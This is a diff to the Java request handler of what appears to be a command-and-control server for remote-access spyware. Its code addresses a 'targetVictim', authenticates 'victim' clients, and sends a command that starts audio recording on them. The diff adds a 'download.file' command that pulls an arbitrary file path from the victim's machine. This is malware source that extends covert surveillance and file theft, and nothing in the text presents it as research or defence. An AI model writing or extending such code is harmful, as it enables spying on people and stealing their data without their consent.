@@ -3,7 +3,7 @@ import io.netty.channel.*;
 import org.json.simple.JSONArray;
 import org.json.simple.JSONObject;
 
-import java.net.SocketAddress;
+import java.net.*;
 import java.util.ArrayList;
 
 public class RequestHandler extends ChannelInboundHandlerAdapter {
@@ -55,7 +55,7 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
     @Override
     public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
         cause.printStackTrace();
-        ctx.channel().close();
+        //ctx.channel().close();
     }
 
     private void receiveUserMessage(User user, JSONObject request) {
@@ -128,6 +128,10 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                     break;
                 case "start.audio.record":
                     targetVictim.sendStartAudioRecord((Long) request.get("seconds"), user.getLogin());
+                    break;
+                case "download.file":
+                    DownloadManager downloadManager = new DownloadManager(user, targetVictim, (String) request.get("path"));
+                    downloadManager.start();
                     break;
                 default:
                     user.sendErrorCode(Config.INCORRECT_QUERY);
@@ -318,7 +322,7 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
             User newUser = new User(ctx, usersData.get(0));
             nettyServer.getUsers().put(ctx.channel().id(), newUser);
             System.out.println("Пользователь " + newUser.getLogin() + " авторизовался!");
-            newUser.sendAuthUser(newUser.getToken());
+            newUser.sendAuthUser();
         } else if (action.equals("auth.victim")) {
             String name = (String) request.get("name");
             //ArrayList<String> owners = (ArrayList<String>) request.get("owners");
